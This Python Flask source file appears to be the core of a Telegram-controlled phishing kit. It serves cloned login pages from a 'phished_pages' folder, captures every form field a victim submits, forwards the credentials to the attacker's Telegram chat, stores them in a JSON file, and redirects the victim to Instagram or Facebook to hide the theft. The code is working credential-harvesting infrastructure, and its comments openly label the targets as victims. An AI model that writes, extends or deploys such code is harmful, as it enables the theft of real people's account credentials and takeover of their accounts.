# Import necessary libraries
from flask import Flask, request, send_from_directory, redirect
import threading
import telebot
import os
import logging
from dotenv import load_dotenv

#Improting from other files
from bot import setup_bot_handlers, run_bot_polling
from template_manager import create_directories, get_available_templates
from creds import initialize_creds_file, save_credentials

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

load_dotenv()

bot_polling_thread = None
is_bot_running = False

app = Flask(__name__, static_folder=None)

API_TOKEN = os.getenv("API_TOKEN")
bot = telebot.TeleBot(API_TOKEN)

setup_bot_handlers(bot)


@app.route('/')
def home():
    return "🤖 Bot is running on Flask!"


#To check bot status
@app.route('/status')
def status():
    global is_bot_running
    templates = get_available_templates()
    return f"Bot running: {is_bot_running}, Available templates: {', '.join(templates)}"


# Route to serve static files (CSS, JS, images)
@app.route('/phish/<user_id>/<path:filename>')
def serve_static(user_id, filename):
    base_dir = os.path.abspath(os.path.dirname(__file__))
    folder = os.path.join(base_dir, "phished_pages", user_id)
    logger.info(f"Serving static file: {filename} from folder: {folder}")
    return send_from_directory(folder, filename)


# Route to serve the phishing page to victims
@app.route('/phish/<user_id>')
def serve_phish_page(user_id):
    base_dir = os.path.abspath(os.path.dirname(__file__))
    folder = os.path.join(base_dir, "phished_pages", user_id)
    logger.info(f"Attempting to serve page from folder: {folder}")
    logger.info(f"Current working directory: {os.getcwd()}")

    if os.path.exists(os.path.join(folder, "index.html")):
        logger.info("Found index.html file")
        try:
            return send_from_directory(folder, "index.html")
        except Exception as e:
            logger.error(f"Error serving index.html: {e}")
            return f"Error serving page: {str(e)}", 500
    logger.error(f"Page not found in folder: {folder}")
    return "Page not found", 404


# Route to handle form submissions from phishing pages can handle both POST & GET
@app.route('/submit/<user_id>', methods=['GET', 'POST'])
def capture_creds(user_id):
    # Extract all form fields submitted by victim
    if request.method == 'POST':
        creds = request.form.to_dict()
    else:  # GET method
        creds = request.args.to_dict()

    # Format credentials as text for Telegram message
    msg = "\n".join(f"{k}: {v}" for k, v in creds.items())

    try:
        # Send credentials to attacker via Telegram
        bot.send_message(user_id, f"🛑 Credentials Captured:\n\n{msg}")
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")

    # Save credentials to JSON file
    save_credentials(user_id, creds)

    # Response to victim's browser - redirect to a common site
    redirect_url = "https://www.instagram.com"
    if "instagram" in creds.get('template', '').lower():
        redirect_url = "https://www.instagram.com"
    elif "facebook" in creds.get('template', '').lower():
        redirect_url = "https://www.facebook.com"

    return redirect(redirect_url)


# Main Function
if __name__ == '__main__':
    # Create required directories
    create_directories()

    # Initialize credentials file
    initialize_creds_file()

    # Start the bot in a separate thread
    bot_polling_thread = threading.Thread(target=lambda: run_bot_polling(bot))
    bot_polling_thread.daemon = True  # Make thread die when main thread exits
    bot_polling_thread.start()

    # Get port from environment variable (for Render compatibility)
    port = int(os.environ.get("PORT", 5000))

    # Start Flask web server
    app.run(host='0.0.0.0', port=port)